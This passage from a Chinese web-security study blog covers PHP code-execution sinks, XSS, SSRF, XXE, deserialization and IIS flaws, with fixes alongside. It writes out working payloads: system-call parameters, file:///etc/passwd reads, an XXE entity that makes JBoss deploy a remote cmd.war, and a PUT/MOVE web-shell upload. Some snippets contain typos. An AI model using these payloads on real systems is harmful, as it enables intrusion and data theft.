<span class="variable">$callback</span>[,<span class="keyword">mixed</span> <span class="variable">$parameter</span>[,<span class="keyword">mixed</span> <span class="variable">$parameter</span> ...]]);</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;arg&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">fun=system&amp;arg=id <span class="comment"># post请求</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 把第一个参数作为回调函数调用，之后跟参数数组</span></span><br><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>,<span class="keyword">array</span> <span class="variable">$param_arr</span>);</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;arg&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">fun=system&amp;arg=id <span class="comment"># post请求</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 根据参数创建匿名函数，并为该匿名函数返回唯一名称</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">create_function</span>(<span class="keyword">string</span> <span class="variable">$args</span>,<span class="keyword">string</span> <span class="variable">$code</span>);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="variable">$code</span>=<span class="string">&#x27;echo&#x27;</span>.<span class="variable">$func</span>.<span class="string">&#x27;test&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$func&#x27;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 等价于下列代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">fucntion <span class="title function_ invoke__">func</span>(<span class="variable">$func</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>.<span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 使用代码</span></span><br><span class="line">?id=<span class="number">1</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/* # 前面需要/*，这是注释保证后面代码颜色*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 为数组每个元素应用回调函数</span></span><br><span class="line"><span class="keyword">array</span> <span class="title function_ invoke__">array_map</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>,<span class="keyword">array</span> <span class="variable">$array1</span>[,<span class="keyword">array</span> <span class="variable">$array2</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$argv</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$argv</span>;</span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 使用代码</span></span><br><span class="line">?func=system&amp;argv=id;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行一个正则表达式的搜索和替换。在subject中正则找到pattern中的内容，用replacement替代</span></span><br><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">preg_replace</span>(<span class="keyword">mixed</span> <span class="variable">$pattern</span>,<span class="keyword">mixed</span> <span class="variable">$replacement</span>,<span class="keyword">mixed</span> <span class="variable">$subject</span>[,<span class="keyword">int</span> <span class="variable">$limit</span>=-<span class="number">1</span>[,<span class="keyword">int</span> &amp;<span class="variable">$count</span>]]);</span><br><span class="line"><span class="comment"># $pattern中以e结尾可以执行php</span></span><br></pre></td></tr></table></figure><h3 id="2-可变函数"><a href="#2-可变函数" class="headerlink" title="2 可变函数"></a>2 可变函数</h3><blockquote><p>变量名后有圆括号会被当成函数执行。</p></blockquote><hr><h2 id="八、XSS漏洞"><a href="#八、XSS漏洞" class="headerlink" title="八、XSS漏洞"></a>八、XSS漏洞</h2><h3 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1 反射型"></a>1 反射型</h3><blockquote><p>发给服务器后服务器执行了script脚本后再发回来，代码不存入服务器。</p><p><a href="https://blog.csdn.net/weixin_45488495/article/details/115793888">反射型XSS原理及实操</a></p><p><code>&lt;srcipt&gt;alter(1)&lt;/script&gt;</code></p><p><code>&lt;script&gt;console.log(document.cookie);&lt;/script&gt;</code></p></blockquote><h3 id="2-存储型"><a href="#2-存储型" class="headerlink" title="2 存储型"></a>2 存储型</h3><blockquote><p>存在服务器。</p><p>发给服务器后服务器执行了script脚本后再发回来，代码存入服务器，之后用户访问都会执行该脚本。</p></blockquote><h3 id="3-DOM型"><a href="#3-DOM型" class="headerlink" title="3 DOM型"></a>3 DOM型</h3><blockquote><p>基于文档对象模型（Document Object Model）</p><p>前端漏洞，存在于script的DOM对象中的漏洞，不与服务器交互。</p><p><code>&lt;img src=1 onerror=alert(/ctfs/)/&gt;</code>：注入代码，找不到源会报错。</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 常见可能存在DOM的代码</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>()</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">writeln</span>()</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">domain</span></span><br><span class="line">&lt;someDOMElement&gt;.<span class="property">innerHTML</span></span><br><span class="line">&lt;someDOMElement&gt;.<span class="property">outerHTML</span></span><br><span class="line">&lt;someDOMElement&gt;.<span class="property">insertAdjacentHTML</span></span><br><span class="line">&lt;someDOMElement&gt;.<span class="property">onevent</span></span><br></pre></td></tr></table></figure><h3 id="4-防护-1"><a href="#4-防护-1" class="headerlink" title="4 防护"></a>4 防护</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 转换字符为HTML字符编码。quotestyle：定义如何对单引号和双引号进行编码</span></span><br><span class="line"><span class="title function_ invoke__">htmlentities</span>(<span class="keyword">string</span>,[quotestyle,character-set]);</span><br><span class="line"><span class="comment"># 预定义特殊字符转化成html实体。如：&amp;,&#x27;,&quot;,&lt;,&gt;</span></span><br><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>(<span class="keyword">string</span>);</span><br></pre></td></tr></table></figure><hr><h2 id="九、SSRF漏洞"><a href="#九、SSRF漏洞" class="headerlink" title="九、SSRF漏洞"></a>九、SSRF漏洞</h2><h3 id="1-利用"><a href="#1-利用" class="headerlink" title="1 利用"></a>1 利用</h3><blockquote><p>Server-Side Request Forge，服务端请求伪造。用于内网渗透。</p><p>原因：服务器可以访问网络中其他服务器，对url没有严格过滤。</p></blockquote><ul><li>利用方式<ul><li>通过服务器获取内网主机、端口和 banner 信息</li><li>对内网的应用程序进行攻击，例如 Redis、JBoss等</li><li>利用 file:// 伪协议读取文件</li><li>可以攻击内网程序，造成缓冲区溢出</li></ul></li><li>易出现场景<ul><li>转码服务</li><li>在线翻译</li><li>分享，通过 url 地址分享文章</li><li>通过 url 地址加载或下载图片</li><li>图片、文章收藏功能</li><li>网站采集、网页抓取</li><li>远程加载头像</li><li>一切可以输入网址和 IP 的地方</li></ul></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 敏感php函数</span></span><br><span class="line"><span class="comment"># 对传入的url进行请求并返回请求结果</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(url);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用</span></span><br><span class="line"><span class="comment"># 端口检测（自连测端口），返回mysql数据库版本信息则是开启，没有返回或长时间不返回则是未开启</span></span><br><span class="line">?url=http:<span class="comment">//127.0.0.1:3306</span></span><br><span class="line"><span class="comment"># 读取文件</span></span><br><span class="line">?url=file:<span class="comment">///etc//passwd</span></span><br><span class="line"><span class="comment"># jmx控制台</span></span><br><span class="line">?url=http:<span class="comment">//ip:port/jmx-console/</span></span><br></pre></td></tr></table></figure><h3 id="2-防护"><a href="#2-防护" class="headerlink" title="2 防护"></a>2 防护</h3><ol><li>过滤请求协议，只允许 http 或者 https 开头的协议。</li><li>严格限制访问的 IP 地址，只允许访问特定 IP 地址。</li><li>限制访问的端口，只允许访问特定的端口。</li><li>设置统一的错误信息，防止造成信息泄露。</li></ol><hr><h2 id="※十、CSRF剖析"><a href="#※十、CSRF剖析" class="headerlink" title="※十、CSRF剖析"></a>※十、CSRF剖析</h2><hr><h2 id="十一、XXE漏洞"><a href="#十一、XXE漏洞" class="headerlink" title="十一、XXE漏洞"></a>十一、XXE漏洞</h2><blockquote><p>应用程序在解析XML时没有过滤外部实体的加载，导致加载了恶意的外部文件，造成执行命令、读取文件、扫描内网、攻击内网等危害</p><p>windows换行：回车（CR）+换行（LF）</p></blockquote><h3 id="1-XML基础"><a href="#1-XML基础" class="headerlink" title="1 XML基础"></a>1 XML基础</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明（定义了XML的版本和编码），必须写在第一行--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--version必选，encoding可选--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span> ?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;!DOCTYPE 根元素 [元素声明]--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;!ELEMENT 元素名 类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--外部文档引用--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--本地--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">SYSTEM</span> <span class="string">&quot;文件名&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--网络--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">PUBLIC</span> “DTD名称” <span class="string">&quot;DTD文档的URL&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">public</span> <span class="string">&quot;-/ctfs/dtd html 4.01/en&quot;</span> <span class="string">&quot;http://www.ctfs-wiki.com/note.dtd&quot;</span></span></span><br></pre></td></tr></table></figure><h3 id="2-XXE漏洞"><a href="#2-XXE漏洞" class="headerlink" title="2 XXE漏洞"></a>2 XXE漏洞</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 示例代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$dom</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>,LIBXML_NOENT|LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span>=<span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$creds</span>-&gt;password;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello &#x27;</span>.<span class="variable">$username</span>;</span><br><span class="line">?</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--文件读取--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">creds</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">username</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">password</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xee;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>test<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--内网探测--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=index.php&quot;</span>&gt;</span>]&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--内网应用攻击--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.deployment:type=DeploymentScanner,flavor=URL&amp;methodIndex=7&amp;arg0=http://10.2.7.11/cmd.war&quot;</span>&gt;</span>]&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文件读取，调用伪协议执行命令--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;except://id&quot;</span>&gt;</span>]&gt;</span><br></pre></td></tr></table></figure><h3 id="3-防护"><a href="#3-防护" class="headerlink" title="3 防护"></a>3 防护</h3><ol><li><p>禁用外部实体</p><blockquote><p>代码中设置 <code>libxml_disable_entity_loader(true)</code></p></blockquote></li><li><p>过滤用户提交的XML数据</p><blockquote><p>过滤关键词为 <code>&lt;! DOCTYPE、&lt;! ENTITY、SYSTEM、PUBLIC</code></p></blockquote></li></ol><hr><h2 id="十二、反序列化漏洞"><a href="#十二、反序列化漏洞" class="headerlink" title="十二、反序列化漏洞"></a>十二、反序列化漏洞</h2><h3 id="1-php反序列化"><a href="#1-php反序列化" class="headerlink" title="1 php反序列化"></a>1 php反序列化</h3><blockquote><p><a href="https://blog.csdn.net/qq_45521281/article/details/105891381">PHP序列化反序列化漏洞总结</a></p></blockquote><h4 id="1-1-序列化知识"><a href="#1-1-序列化知识" class="headerlink" title="1.1 序列化知识"></a>1.1 序列化知识</h4><blockquote><p>序列化：<code>serialize($class);</code></p><p>当序列化对象时，PHP在序列化动作之前调用该对象成员函数<code>__sleep</code>。这样就允许对象在被序列化之前做任何清除操作。</p><p>反序列化：<code>unserialize($class);</code></p><p>若被序列化的变量是一个对象，在重新构造对象后，会自动调用<code>__wakeup</code>成员函数（如果有的话）。</p></blockquote><div class="table-container"><table><thead><tr><th>序列化前</th><th>序列化后</th></tr></thead><tbody><tr><td>NULL</td><td><code>N</code></td></tr><tr><td>boolean</td><td><code>b:0，b:1</code></td></tr><tr><td>integer</td><td><code>i:&lt;num&gt;</code></td></tr><tr><td>double</td><td><code>d:&lt;num&gt;</code></td></tr><tr><td>string</td><td><code>s:&lt;length&gt;:&quot;&lt;value&gt;&quot;</code></td></tr><tr><td>array</td><td><code>a:&lt;len&gt;:&#123;&lt;key1&gt;&lt;value1&gt;...&#125;</code></td></tr><tr><td>object</td><td><code>O:&lt;class_name_length&gt;:&lt;class_name&gt;:&lt;len&gt;:&#123;&lt;field name1&gt;&lt;field value1&gt;...&#125;</code>，只有属性没有字段</td></tr></tbody></table></div><h4 id="1-2-序列化利用"><a href="#1-2-序列化利用" class="headerlink" title="1.2 序列化利用"></a>1.2 序列化利用</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">__construct</span>([<span class="keyword">mixed</span> <span class="variable">$args</span>[, $...]]);</span><br><span class="line"><span class="comment">// 析构函数</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">__destruct</span>(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化自动调用</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">__wakeup</span>();</span><br><span class="line"><span class="comment">// 反序列化自动调用</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">__sleep</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.更改对象的&lt;len&gt;值，当序列化字符串中表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行。</span></span><br></pre></td></tr></table></figure><h3 id="2-JAVA反序列化"><a href="#2-JAVA反序列化" class="headerlink" title="2 JAVA反序列化"></a>2 JAVA反序列化</h3><hr><h2 id="十三、中间件漏洞"><a href="#十三、中间件漏洞" class="headerlink" title="十三、中间件漏洞"></a>十三、中间件漏洞</h2><h3 id="1-IIS"><a href="#1-IIS" class="headerlink" title="1 IIS"></a>1 IIS</h3><h4 id="1-1-PUT上传漏洞"><a href="#1-1-PUT上传漏洞" class="headerlink" title="1.1 PUT上传漏洞"></a>1.1 PUT上传漏洞</h4><ul><li><p>IIS6.0 PUT漏洞原因</p><blockquote><p>WebDAV是一种基于 HTTP1.1的通信协议，扩展了方法，让应用程序可以直接对服务器操作，并支持文件 lock 和 unlock ， 还支持文件的版本控制。</p></blockquote><ol><li>IIS Server 在 Web 服务扩展中开启了 WebDAV。</li><li>IIS 配置了可以写入的权限。</li></ol></li><li><p>漏洞利用：</p><ol><li><p>利用 OPTIONS 测试 WebDAV 是否开启</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">OPTIONS</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">HOST:host_ip</span><br></pre></td></tr></table></figure></li><li><p>利用 PUT 协议上传 &lt;%eval request(“123”)%&gt; 的 txt 文件</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">......（构造包头）</span><br><span class="line"> &lt;%eval request(&quot;123&quot;)%&gt;</span><br></pre></td></tr></table></figure></li><li><p>利用 move 方法将扩展改成 asp</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/1.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">HOST:host_ip</span><br><span class="line">Destination:url/shell.asp</span><br></pre></td></tr></table></figure></li></ol></li></ul><h4 id="1-2-短文件名枚举漏洞"><a href="#1-2-短文件名枚举漏洞" class="headerlink" title="1.2 短文件名枚举漏洞"></a>1.2 短文件名枚举漏洞</h4><ul><li><p style="color:red">漏洞原理</p><blockquote><p>…</p><p>例如文件中存在一个名为backup-09df9a1s9d1ga9sdg1as.sql的文件，此时只需要访问<a href="http://ip/backup~1.sql就可以访问到。">http://ip/backup~1.sql就可以访问到。</a></p></blockquote></li><li><p>漏洞利用</p><blockquote><p>设 IIS6.0，网站根目录存在backup698.txt。</p><ol><li>访问<a href="http://ip/a\*~1\*/.aspx，返回400，说明不存在。">http://ip/a\*~1\*/.aspx，返回400，说明不存在。</a></li><li>访问<a href="http://ip/b\*~1\*/.aspx，返回404，说明存在。">http://ip/b\*~1\*/.aspx，返回404，说明存在。</a></li><li>然后继续试<a href="http://ip/ba\*~1\*/.aspx，以此类推。">http://ip/ba\*~1\*/.aspx，以此类推。</a></li><li>判断出前六位之后，去除后面那个*号再测试一次。如果返回404表示是文件夹，400则是文件（因为*是通配符）</li></ol><p>漏洞利用工具：<a href="https://github.com/lijiejie/IIS_shortname_Scanner/pulls">IIS_shortname_Scanner</a></p></blockquote></li></ul><div class="table-container"><table><thead><tr><th>IIS 版本</th><th>URL</th><th>结果/错误信息</th></tr></thead><tbody><tr><td>IIS 6</td><td>/valid*~1*/.aspx</td><td>HTTP 404-File not found</td></tr><tr><td>IIS 6</td><td>/Invalid*~1*/.aspx</td><td>HTTP 400-Bad Request</td></tr><tr><td>IIS 5.x</td><td>/valid*~1*</td><td>HTTP 404-File not found</td></tr><tr><td>IIS 5.x</td><td>/Invalid*~1*</td><td>HTTP 400-Bad Request</td></tr><tr><td>IIS 7.x.NET.2（无出错处理）</td><td>/valid*~1*/</td><td>页面中包含“Error Code 0x00000000”</td></tr><tr><td>IIS 7.x.NET.2（无出错处理）</td><td>/Invalid*~1*/</td><td>页面中包含“Error Code 0x80070002”</td></tr></tbody></table></div><ul><li><p>漏洞修复</p><ol><li><p>关闭NTFS对8.3文件名格式的支持</p><blockquote><p>修改下列的注册列表值为1，然后重启。（此修改只能禁止NTFS对8.3文件名格式的支持，无法移除已经存在的文件的段文件名）</p><p><code>HKLM\STSTEM\CurrentControlSet\Control\FileSystem\NtfsDisable8dot3NameCreation</code></p></blockquote></li><li><p>禁用ASP.NET</p><blockquote><p>IIS管理器——Web服务扩展——ASP.NET禁用</p></blockquote></li><li><p>禁止在url中用”~”以及其Unicode编码。</p></li></ol></li></ul><h4 id="1-3-HTTPS-sys"><a href="#1-3-HTTPS-sys" class="headerlink" title="1.3 HTTPS.sys"></a>1.3 HTTPS.sys</h4><h3 id="2-JBoss"><a href="#2-JBoss" class="headerlink" title="2 JBoss"></a>2 JBoss</h3><ul><li><p>重要目录文件</p></li><li><p>未授权访问</p></li></ul><h3 id="3-Tomcat"><a href="#3-Tomcat" class="headerlink" title="3 Tomcat"></a>3 Tomcat</h3><ul><li><p>弱口令</p></li><li><p>远程代码执行</p></li></ul><h3 id="4-WebLogic"><a href="#4-WebLogic" class="headerlink" title="4 WebLogic"></a>4 WebLogic</h3><ul><li>弱口令</li></ul><hr><h2 id="十四、解析漏洞"><a href="#十四、解析漏洞" class="headerlink" title="十四、解析漏洞"></a>十四、解析漏洞</h2><h3 id="1-Web容器"><a href="#1-Web容器" class="headerlink" title="1 Web容器"></a>1 Web容器</h3><h3 id="2-Apache"><a href="#2-Apache" class="headerlink" title="2 Apache"></a>2 Apache</h3><h3 id="3-PHP-CGI"><a href="#3-PHP-CGI" class="headerlink" title="3 PHP CGI"></a>3 PHP CGI</h3><h3 id="4-IIS"><a href="#4-IIS" class="headerlink" title="4 IIS"></a>4 IIS</h3><h3 id="5-Nginx"><a href="#5-Nginx" class="headerlink" title="5 Nginx"></a>5 Nginx</h3><hr><h2 id="十五、数据库漏洞"><a href="#十五、数据库漏洞" class="headerlink" title="十五、数据库漏洞"></a>十五、数据库漏洞</h2><h3 id="1-SQL-Server"><a href="#1-SQL-Server" class="headerlink" title="1 SQL Server"></a>1 SQL Server</h3><h3 id="2-MySQL"><a href="#2-MySQL" class="headerlink" title="2 MySQL"></a>2 MySQL</h3><h3 id="3-Oracle"><a href="#3-Oracle" class="headerlink" title="3 Oracle"></a>3 Oracle</h3><h3 id="4-Redis"><a href="#4-Redis" class="headerlink" title="4 Redis"></a>4 Redis</h3><h3 id="5-漏洞修复"><a href="#5-漏洞修复" class="headerlink" title="5 漏洞修复"></a>5 漏洞修复</h3><hr><h2 id="※十六、PHP代码审计"><a href="#※十六、PHP代码审计" class="headerlink" title="※十六、PHP代码审计"></a>※十六、PHP代码审计</h2><ul><li>网页源码<ol><li><strong>【命令执行】</strong>cat php|base64：直接显示。</li><li><strong>【命令执行】</strong>使用 cat php 包含网页后可以：网页右键——查看源代码。</li></ol></li></ul><hr><h2 id="※十七、逻辑漏洞"><a href="#※十七、逻辑漏洞" class="headerlink" title="※十七、逻辑漏洞"></a>※十七、逻辑漏洞</h2>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web渗透工具</title>
      <link href="/posts/5cfe0bd9.html"/>
      <url>/posts/5cfe0bd9.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web渗透工具"><a href="#Web渗透工具" class="headerlink" title="Web渗透工具"></a>Web渗透工具</h1><blockquote><p><a href=".\c5fc2764">text::Kali Linux</a> </p><p><a href=".\54924480">text::Web渗透</a> </p></blockquote><hr><h2 id="一、VMware"><a href="#一、VMware" class="headerlink" title="一、VMware"></a>一、VMware</h2><h3 id="1-网络"><a href="#1-网络" class="headerlink" title="1 网络"></a>1 网络</h3><blockquote><p>编辑——虚拟网络编辑器。（每一个名称相当于一台交换机）</p></blockquote><ul><li>桥接模式：和物理机并列，相当于在物理网中真的加入了一台主机。</li><li>仅主机模式：类似NAT模式，但是默认不连接外界。</li><li>NAT模式：流量通过物理机走向外界。</li></ul><h3 id="2-本地"><a href="#2-本地" class="headerlink" title="2 本地"></a>2 本地</h3><ul><li>虚拟机[右键]——快照——拍摄快照：备份。</li><li>虚拟机[右键]——快照——快到管理器：恢复虚拟机状态。</li><li>虚拟机[右键]——管理——克隆</li><li>文件——导出为OVF：导出</li></ul><h3 id="3-安装"><a href="#3-安装" class="headerlink" title="3 安装"></a>3 安装</h3><ul><li>Win10<ul><li><a href="https://www.bilibili.com/video/BV1W841147At">教程网址</a></li><li><a href="https://www.123pan.com/s/g520Vv-iG2id">工具网址</a></li></ul></li></ul><hr><h2 id="二、浏览器工具"><a href="#二、浏览器工具" class="headerlink" title="二、浏览器工具"></a>二、浏览器工具</h2><h3 id="1-分类"><a href="#1-分类" class="headerlink" title="1 分类"></a>1 分类</h3><ul><li><p>The Searchable Subject Index</p><blockquote><p>索引式搜索，只搜索站点的 Title 和 Meta 信息，无法搜索个人主页。（Yahoo）</p></blockquote></li><li><p>The Full-Text Search Engine</p><blockquote><p>完全内容搜索引擎，通过 Spider 搜索全面的信息。（Google）</p></blockquote></li></ul><h3 id="2-Edge"><a href="#2-Edge" class="headerlink" title="2 Edge"></a>2 Edge</h3><ul><li><p>命令</p><blockquote><p>在url前加 read: 会进入阅读模式。</p><p>edge://surf：摸鱼。</p><p>其他命令同谷歌一样，Edge的内核是谷歌浏览器。</p></blockquote></li><li><p>扩展</p><ul><li>扩展商店<ul><li>广告拦截：adguard 广告拦截器</li><li>允许复制：Simple Allow Copy（已失效）</li><li>下载视频：aix智能下载器</li><li>VPN：Magic VPN || BestGo VPN（可 ChatGPT）</li></ul></li><li>Google Shop<ul><li>chatgpt for google</li><li>WebChatGPT（好像没用）</li></ul></li></ul></li></ul><h3 id="3-Google-Chrome"><a href="#3-Google-Chrome" class="headerlink" title="3  Google Chrome"></a>3  Google Chrome</h3><h4 id="3-1-配置"><a href="#3-1-配置" class="headerlink" title="3.1 配置"></a>3.1 配置</h4><ol><li><p>不安全链接</p><blockquote><p>在当前页面用键盘输入 <code>thisisunsafe</code> ，不是在地址栏输入，就直接敲键盘就行了，页面即会自动刷新进入网页。</p></blockquote></li></ol><h4 id="3-2-常用命令（Edge也可用）"><a 